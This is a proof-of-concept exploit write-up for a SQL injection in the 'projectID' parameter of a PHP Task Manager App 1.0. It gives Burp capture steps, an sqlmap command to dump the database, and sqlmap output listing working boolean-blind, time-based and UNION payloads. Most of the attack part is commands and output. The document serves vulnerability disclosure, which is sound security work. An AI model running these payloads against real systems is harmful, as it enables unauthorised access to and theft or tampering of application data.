# Task Manager App - SQL Injection - 1
+ **Exploit Title:** Task Manager App - SQL Injection - 1
+ **Date:** 2024-02-02
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/task-manager-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Task Manager App 1.0 allows SQL Injection via the 'projectID' parameter at "/TaskManager/EditProject.php?edit=1&projectID=2". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/TaskManager/"
+ Click on the Projects button
+ Then click 'Edit' button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /TaskManager/EditProject.php?edit=1&projectID=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.3
```

+ Use sqlmap to exploit. In sqlmap, use 'projectID' parameter to dump the database.
```
sqlmap -r r.txt -p projectID --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: projectID (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: edit=1&projectID=2' AND 7909=(SELECT (CASE WHEN (7909=7909) THEN 7909 ELSE (SELECT 1580 UNION SELECT 9184) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: edit=1&projectID=2' AND (SELECT 9888 FROM (SELECT(SLEEP(5)))NRJF)-- XBQU

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: edit=1&projectID=-3909' UNION ALL SELECT CONCAT(0x716b627671,0x51624d674a6753454e62564174786568454b514c5052585749516279787a525643774d5746525a73,0x71627a7a71),NULL,NULL-- -
---
[20:47:52] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:47:52] [INFO] fetching current database
current database: 'TaskManager'
```
+ current database: `TaskManager`

![Ekran görüntüsü 2024-02-02 044847](https://github.com/BurakSevben/CVEs/assets/117217689/c5d126ec-8a37-4679-8390-d3870f30a7f6)
